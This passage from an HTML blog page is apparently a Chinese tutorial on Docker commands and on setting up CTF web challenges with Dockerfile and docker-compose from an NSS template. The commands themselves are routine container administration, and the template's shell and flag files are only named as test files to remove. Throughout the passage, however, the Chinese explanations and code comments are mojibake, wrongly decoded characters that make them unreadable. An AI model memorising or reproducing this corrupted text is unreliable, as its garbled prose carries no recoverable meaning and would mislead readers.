å°„ç«¯å£ tutum/lamp</span><br><span class="line"><span class="meta">#æ˜ å°„ç«¯å£å‰é¦–å…ˆç¡®å®šç«¯å£æ²¡æœ‰è¢«å ç”¨</span></span><br><span class="line"><span class="meta">#-d <span class="comment">//å®¹å™¨åå°è¿è¡Œã€‚</span></span></span><br><span class="line"><span class="meta">#-p <span class="comment">//æŒ‡å®šæ˜ å°„ç«¯å£ã€‚</span></span></span><br><span class="line"><span class="meta">#-P <span class="comment">//éšæœºæ˜ å°„é«˜ç«¯å£</span></span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -d -p <span class="number">9999</span>:<span class="number">80</span> tutum/lamp</span><br></pre></td></tr></table></figure><p><strong>å¤åˆ¶æ–‡ä»¶è¿›å…¥docker</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp [æœ¬åœ°è·¯å¾„] [container id]<span class="symbol">:</span>[container è·¯å¾„]</span><br><span class="line">ä¾‹å¦‚:</span><br><span class="line">docker cp flag.php dockeråå­—<span class="symbol">:/var/www/html</span></span><br></pre></td></tr></table></figure><p><strong>æŸ¥è¯¢å®¿ä¸»æœºip</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥æŒ‡å®šdocker</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it dockeråå­— <span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="meta">#å¦‚æœä»è¿™ä¸ªå®¹å™¨é€€å‡ºï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ï¼Œæ¨èä½¿ç”¨ docker exec</span></span><br><span class="line"><span class="meta">#-i <span class="comment">//è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚</span></span></span><br><span class="line"><span class="meta">#-t <span class="comment">//è®©dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å‡ºä¸Šã€‚</span></span></span><br></pre></td></tr></table></figure><p><strong>é€€å‡ºå½“å‰dockerå®¹å™¨</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p><strong>å¯¼å‡ºå®¹å™¨</strong></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">docker</span> ex<span class="keyword">port</span> [dockerID] &gt; Find.tar</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨å®¹å™¨</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> å®¹å™¨ID</span><br></pre></td></tr></table></figure><p><strong>æŸ¥çœ‹æ‰€æœ‰å­˜åœ¨çš„å®¹å™¨</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">container</span> <span class="keyword">ls</span> -a</span><br></pre></td></tr></table></figure><p><strong>åˆ é™¤å®¹å™¨</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [<span class="built_in">container</span> id]æˆ–è€…æ˜¯[<span class="built_in">container</span> name]</span><br><span class="line"><span class="meta">#éœ€è¦å…ˆæŠŠå®¹å™¨åœæ‰</span></span><br></pre></td></tr></table></figure><h2 id="æ¨¡æ¿ä»‹ç»"><a href="#æ¨¡æ¿ä»‹ç»" class="headerlink" title="æ¨¡æ¿ä»‹ç»"></a>æ¨¡æ¿ä»‹ç»</h2><p>ååˆ†æ„Ÿè°¢nssçš„å¸ˆå‚…æä¾›çš„æ¨¡æ¿å•¦ï¼Œè¿™é‡Œé™„ä¸Šé“¾æ¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CTF-Archives/</span>ctf-docker-template</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜"><a href="#åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜" class="headerlink" title="åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜"></a>åˆ©ç”¨dockerfileå’Œdocker-composeå‡ºé¢˜</h2><p>è¿™é‡Œæ„Ÿè°¢f12å¤§ä½¬æä¾›çš„å¸®åŠ©</p><h3 id="è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ"></a>è¿™ä¿©ä¸œè¥¿æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸¤ä¸ªä¸ªæ¦‚å¿µ;</p><p>ï¼ˆ1ï¼‰é•œåƒï¼š<br>ä»€ä¹ˆæ˜¯é•œåƒï¼Ÿå½“æˆ‘ä»¬åœ¨è™šæ‹Ÿæœºå¯åŠ¨dockeråï¼Œè¿è¡Œdocker imagesï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°çš„å°±æ˜¯æˆ‘ä»¬dockeré‡Œæ‰€æ‹¥æœ‰çš„é•œåƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/eb83d995c2a91cec54d44f0f93191b9.png" alt=""></p><p>ä¸Šé¢çš„äº”åˆ—ä¾æ¬¡æ˜¯ é•œåƒåç§°  é•œåƒæ ‡ç­¾  é•œåƒid  é•œåƒåˆ›å»ºæ—¶é—´  é•œåƒå¤§å°</p><p>ï¼ˆ2ï¼‰å®¹å™¨ï¼š</p><p>é•œåƒæ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„å‘¢ï¼Ÿå½“ç„¶æ˜¯åˆ›å»ºå®¹å™¨å•¦ï¼Œå½“æˆ‘ä»¬è¾“å…¥docker ps(æŸ¥çœ‹åœ¨è¿è¡Œçš„å®¹å™¨)æˆ–è€…docker ps -a(æŸ¥çœ‹æ‰€æœ‰å®¹å™¨)å°±å¯ä»¥çœ‹åˆ°å®¹å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b0e20b86ca59ba33927055323c6f6c1.png" alt=""></p><p>äº†è§£äº†è¿™äº›åŸºç¡€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»§ç»­ä¸‹é¢çš„å†…å®¹äº†</p><h4 id="å…ˆä»‹ç»dockerfile"><a href="#å…ˆä»‹ç»dockerfile" class="headerlink" title="å…ˆä»‹ç»dockerfile:"></a><strong>å…ˆä»‹ç»dockerfile:</strong></h4><p>dockerfileå°†ä¸€äº›éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­,åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œã€‚æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶æï¼Ÿè¿™ä¸ªæ—¶å€™å°±è¦æåˆ°docker builidè¿™ä¸ªæŒ‡ä»¤äº†ï¼Œä½¿ç”¨æ ¼å¼å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="tag">&lt;<span class="name">é•œåƒåç§°</span>&gt;</span>:<span class="tag">&lt;<span class="name">é•œåƒæ ‡ç­¾</span>&gt;</span> <span class="tag">&lt;<span class="name">ä¸Šä¸‹æ–‡è·¯å¾„</span>&gt;</span></span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">docker build -t sql:v1 .</span><br><span class="line">è¿™é‡Œçš„.æ˜¯å½“å‰ç›®å½•çš„æ„æ€ï¼Œè¿™ä¸»è¦æ˜¯ç»™dockerä¸€ä¸ªå¼•ç”¨è·¯å¾„ï¼Œå‘Šè¯‰dockerä½ éœ€è¦çš„æ–‡ä»¶éƒ½åœ¨å½“å‰ç›®å½•ä»¥åŠå…¶å­ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè¯¥å‘½ä»¤ä¼šè‡ªåŠ¨æœç´¢.åŠå…¶å­ç›®å½•ä¸‹çš„åä¸ºdockerfileçš„æ–‡ä»¶</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f è·¯å¾„</span></span><br><span class="line">æ­¤æ–¹æ³•å¯ä»¥æŒ‡å®šæ–‡ä»¶ä½œä¸ºdockerfileä½¿ç”¨</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_46090675/article/details/121846718?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169046011616800180651767%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169046011616800180651767&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-121846718-null-null.142^v91^insertT0,239^v3^insert_chatgpt&amp;utm_term=dockerfile&amp;spm=1018.2226.3001.4187</a></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/17c52f8981f341a48dc82ab82918461e.png" alt=""></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/b370884a35ec495dbe708fd704598e9b.png" alt=""></p><p><strong>å¯¹äºä»¥ä¸‹ä»£ç çš„ç†è§£å¯ä»¥å‚è€ƒNSSçš„æ¨¡æ¿web-nginx-mysql-php73ï¼Œé™„ä¸Šæˆªå›¾</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727231741.png" alt=""></p><h5 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h5><p>æŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span></span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span>:<span class="symbol">&lt;tag&gt;</span></span><br><span class="line">ã€€ã€€FROM <span class="symbol">&lt;image&gt;</span>@<span class="symbol">&lt;digest&gt;</span></span><br><span class="line"></span><br><span class="line">ç¤ºä¾‹ï¼šã€€ã€€</span><br><span class="line">FROM mysq<span class="variable">l:5</span>.<span class="number">6</span></span><br><span class="line">æ³¨ï¼š</span><br><span class="line">   <span class="keyword">tag</span>æˆ–digestæ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸ä½¿ç”¨è¿™ä¸¤ä¸ªå€¼æ—¶ï¼Œä¼šä½¿ç”¨latestç‰ˆæœ¬çš„åŸºç¡€é•œåƒ</span><br></pre></td></tr></table></figure><h5 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h5><p>æ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span>ç”¨äºåœ¨æ„å»ºé•œåƒæ—¶æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æœ‰ä»¥ä¸‹ä¸¤ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š</span><br><span class="line"><span class="keyword">shell</span>æ‰§è¡Œ</span><br><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> &lt;command&gt;</span><br><span class="line">execæ‰§è¡Œ</span><br><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>]</span><br><span class="line">    <span class="keyword">RUN</span> apk <span class="keyword">update</span></span><br><span class="line">    <span class="keyword">RUN</span> [<span class="string">&quot;/etc/execfile&quot;</span>, <span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg1&quot;</span>]</span><br><span class="line">æ³¨ï¼š<span class="keyword">RUN</span>æŒ‡ä»¤åˆ›å»ºçš„ä¸­é—´é•œåƒä¼šè¢«ç¼“å­˜ï¼Œå¹¶ä¼šåœ¨ä¸‹æ¬¡æ„å»ºä¸­ä½¿ç”¨ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨è¿™äº›ç¼“å­˜é•œåƒï¼Œ</span><br><span class="line">å¯ä»¥åœ¨æ„å»ºæ—¶æŒ‡å®š--<span class="keyword">no</span>-cacheå‚æ•°ï¼Œå¦‚ï¼šdocker build --<span class="keyword">no</span>-cache</span><br></pre></td></tr></table></figure><h5 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h5><p>å°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼Œtarç±»å‹æ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹(ç½‘ç»œå‹ç¼©èµ„æºä¸ä¼šè¢«è§£å‹)ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œèµ„æºï¼Œç±»ä¼¼wget</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="built_in">ADD</span> &lt;src&gt;<span class="built_in">..</span>. &lt;dest&gt;</span><br><span class="line">    <span class="built_in">ADD</span> [<span class="string">&quot;&lt;src&gt;&quot;</span>,<span class="built_in">..</span>. <span class="string">&quot;&lt;dest&gt;&quot;</span>] ç”¨äºæ”¯æŒåŒ…å«ç©ºæ ¼çš„è·¯å¾„</span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="built_in">ADD</span> hom* /mydir/          # æ·»åŠ æ‰€æœ‰ä»¥<span class="string">&quot;hom&quot;</span>å¼€å¤´çš„æ–‡ä»¶</span><br><span class="line">    <span class="built_in">ADD</span> hom?.txt /mydir/      # ? æ›¿ä»£ä¸€ä¸ªå•å­—ç¬¦,ä¾‹å¦‚ï¼š<span class="string">&quot;home.txt&quot;</span></span><br><span class="line">    <span class="built_in">ADD</span> test relativeDir/     # æ·»åŠ  <span class="string">&quot;test&quot;</span> åˆ° `WORKDIR`/relativeDir/</span><br><span class="line">    <span class="built_in">ADD</span> test /absoluteDir/    # æ·»åŠ  <span class="string">&quot;test&quot;</span> åˆ° /absoluteDir/</span><br></pre></td></tr></table></figure><h5 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h5><p>åŠŸèƒ½ç±»ä¼¼ADDï¼Œä½†æ˜¯æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æº</p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;executable&quot;</span>,<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼˜å…ˆ)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;param1&quot;</span>,<span class="string">&quot;param2&quot;</span>] (è®¾ç½®äº†ENTRYPOINTï¼Œåˆ™ç›´æ¥è°ƒç”¨ENTRYPOINTæ·»åŠ å‚æ•°)</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">command</span> param1 param2 (æ‰§è¡Œshellå†…éƒ¨å‘½ä»¤)</span></span><br><span class="line">ç¤ºä¾‹ï¼š</span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;This is a test.&quot;</span> | <span class="built_in">wc</span> -l</span></span><br><span class="line">    <span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/wc&quot;</span>,<span class="string">&quot;--help&quot;</span>]</span></span><br><span class="line"></span><br><span class="line">æ³¨ï¼š<span class="keyword">CMD</span><span class="language-bash">ä¸åŒäºRUNï¼ŒCMDç”¨äºæŒ‡å®šåœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€ŒRUNç”¨äºæŒ‡å®šé•œåƒæ„å»ºæ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</span></span><br></pre></td></tr></table></figure><h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose:"></a><strong>docker-compose:</strong></h4><p>docker-compseåƒæ˜¯ä¸€ä¸ªä¸­æ§ç³»ç»Ÿï¼Œä»–å¯ä»¥æ§åˆ¶ç”±ä»–å¯åŠ¨çš„æ‰€æœ‰å®¹å™¨ï¼ŒåŒæ—¶å¯åŠ¨ã€åŒæ—¶å…³é—­ã€åŒæ—¶åˆ é™¤ç­‰ï¼Œå‘½åä¸€èˆ¬ä¸ºxxxxx.yamlï¼Œå†…å®¹æ ¼å¼å¦‚ä¸‹ï¼Œä»¥NSSæ¨¡æ¿web-nginx-mysql-php73ä¸ºä¾‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230727224529.png" alt=""></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é‡ç‚¹å…³æ³¨serviceséƒ¨åˆ†ï¼Œç¼©è¿›ä¸€æ¬¡çš„webå’Œwwwä¸ºé•œåƒåï¼Œç¼©è¿›ä¸¤æ¬¡çš„ä¸ºå®¹å™¨å‚æ•°ï¼Œä¾‹å¦‚å¼€æ”¾ç«¯å£ã€æ˜ å°„ç«¯å£ã€å®¹å™¨åã€å¯åŠ¨çš„dockerfileä½ç½®ï¼ˆ<span class="keyword">build</span>å‚æ•°ï¼‰ï¼Œè¿™æ ·å¯ä»¥å®ç°åŒæ—¶å¯åŠ¨å¤šä¸ªä¸åŒå®¹å™¨ã€‚</span><br></pre></td></tr></table></figure><p><strong>å¯åŠ¨å‘½ä»¤</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œ</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose -f docker-compose.yml up -d   <span class="regexp">//</span>æŒ‡å®šç›®å½•</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230728133207.png" alt=""></p><p>è¿™é‡Œå°±å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼Œæˆ‘ä»¬æ‰§è¡Œdocker-compose up -dåï¼Œå¯åŠ¨äº†name4å’Œname5è¿™ä¸¤ä¸ªå®¹å™¨ï¼Œç„¶åæ„å»ºäº†docker_wwwå’Œdocker_webè¿™ä¸¤ä¸ªæœåŠ¡å™¨é•œåƒï¼Œæ­¤å¤„çš„é•œåƒæ˜¯å¯ä»¥é€šè¿‡ä¸Šè¿°runå‘½ä»¤äºŒæ¬¡ä½¿ç”¨çš„ï¼Œæ³¨æ„docker-composeåªèƒ½ç®¡ç†ç”±docker-composeæ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œè€Œrunå¯åŠ¨çš„æ˜¯ä¸å¯ä»¥æ§åˆ¶çš„ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker-compose restart   <span class="regexp">//</span>é‡å¯æœåŠ¡å®¹å™¨ã€‚</span><br><span class="line">docker-compose start     <span class="regexp">//</span>å¯åŠ¨æœåŠ¡å®¹å™¨ã€‚</span><br><span class="line">docker-compose stop      <span class="regexp">//</span>åœæ­¢æœåŠ¡å®¹å™¨ã€‚</span><br><span class="line">docker-compose rm        <span class="regexp">//</span>åˆ é™¤æœåŠ¡ï¼ˆåœæ­¢çŠ¶æ€ï¼‰å®¹å™¨ã€‚</span><br><span class="line">docker-compose down      <span class="regexp">//</span>åœæ­¢å¹¶åˆ é™¤æ‰€æœ‰æœåŠ¡çš„å®¹å™¨ã€ç½‘ç»œã€é•œåƒã€æ•°æ®å·ã€‚</span><br><span class="line">docker-compose images    <span class="regexp">//</span>æ‰“å°æœåŠ¡å®¹å™¨æ‰€å¯¹åº”çš„é•œåƒã€‚</span><br></pre></td></tr></table></figure><h4 id="å‡ºé¢˜å»ºè®®-web-nginx-mysql-php73"><a href="#å‡ºé¢˜å»ºè®®-web-nginx-mysql-php73" class="headerlink" title="å‡ºé¢˜å»ºè®®(web-nginx-mysql-php73)"></a>å‡ºé¢˜å»ºè®®(web-nginx-mysql-php73)</h4><h5 id="åŸºæœ¬æ¡†æ¶"><a href="#åŸºæœ¬æ¡†æ¶" class="headerlink" title="åŸºæœ¬æ¡†æ¶"></a><strong>åŸºæœ¬æ¡†æ¶</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ docker</span><br><span class="line">â”‚   â””â”€â”€ docker-compose<span class="selector-class">.yml</span></span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ db<span class="selector-class">.sql</span></span><br><span class="line">â”œâ”€â”€ service</span><br><span class="line">â”‚   â””â”€â”€ docker-entrypoint<span class="selector-class">.sh</span></span><br><span class="line">â””â”€â”€ <span class="attribute">src</span></span><br><span class="line">â”œâ”€â”€ shell<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ index<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ flag<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ connect<span class="selector-class">.php</span></span><br><span class="line">â”œâ”€â”€ source</span><br><span class="line">â””â”€â”€ assets</span><br><span class="line">â””â”€â”€ bootstrap</span><br><span class="line">â”œâ”€â”€ css</span><br><span class="line">â””â”€â”€ js</span><br></pre></td></tr></table></figure><p>é™„ä¸Šå¤§ä½¬çš„è®²è§£è§†é¢‘ï¼Œéå¸¸è¯¦ç»†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.bilibili.com<span class="regexp">/video/</span>BV1xW4y1Z7aa/?spm_id_from=<span class="number">333.999</span>.<span class="number">0.0</span>&amp;vd_source=<span class="number">757</span>ded406aff262d5f6010cb1a347a9a</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ¡†æ¶å·²ç»æ˜¯éå¸¸å®Œæ•´çš„äº†ï¼Œåªéœ€è¦æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚ç¨åŠ ä¿®æ”¹å°±å¯ä»¥è½»æ¾å‡ºé¢˜å•¦ï¼</p><h5 id="åˆ é™¤éƒ¨åˆ†"><a href="#åˆ é™¤éƒ¨åˆ†" class="headerlink" title="åˆ é™¤éƒ¨åˆ†"></a><strong>åˆ é™¤éƒ¨åˆ†</strong></h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell<span class="selector-class">.php</span></span><br><span class="line">flag<span class="selector-class">.php</span></span><br><span class="line">docker-compose.ymlä¸­çš„ç¯å¢ƒå˜é‡è®¾ç½®</span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šéƒ¨åˆ†ä¸ºæµ‹è¯•ç”¨é€”ï¼Œæ²¡ç”¨ä¸€å®šå¾—åˆ ï¼Œé˜²æ­¢å‡ºç°éé¢„æœŸè§£</span><br></pre></td></tr></table></figure><h5 id="ä¿®æ”¹éƒ¨åˆ†"><a href="#ä¿®æ”¹éƒ¨åˆ†" class="headerlink" title="ä¿®æ”¹éƒ¨åˆ†"></a><strong>ä¿®æ”¹éƒ¨åˆ†</strong></h5><p>ï¼ˆ1ï¼‰ï¼šconnect.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸»è¦ç”¨äºæ•°æ®åº“è¿æ¥ï¼Œå…¶ä¸­çš„å‚æ•°å¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œä½†ä¸€å®šæ³¨æ„è¦å’Œdockerfileä¸­çš„å‚æ•°å€¼ä¿æŒä¸€è‡´ï¼ŒäºŒè€…å¿…é¡»åŒæ—¶ä¿®æ”¹</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ï¼šindex.phpã€docker-entrypoint.shã€docker-compose.yaml</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¸‰è€…ä¸»è¦æ˜¯ç”¨äºä¸ªæ€§åŒ–çš„ä¿®æ”¹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">index</span>.phpä¸å¿…å¤šè¯´ï¼Œä¸»è¦æ˜¯å®Œå–„ä½ è‡ªå·±æƒ³å‡ºçš„<span class="keyword">sql</span>è¯­å¥ä»¥åŠè¿‡æ»¤ç­‰</span><br><span class="line"></span><br><span class="line">docker-entrypoint.sh é‡Œé¢æœ‰ä¸¤ç§flagçš„ç”Ÿæˆæ ¼å¼ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œä¿®æ”¹</span><br><span class="line"></span><br><span class="line">docker-compose.yaml å¯ä»¥è°ƒæ•´å¼€å¯çš„ç«¯å£ä»¥åŠç¯å¢ƒå˜é‡ç­‰å› ç´ </span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ï¼šDockerfile</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ 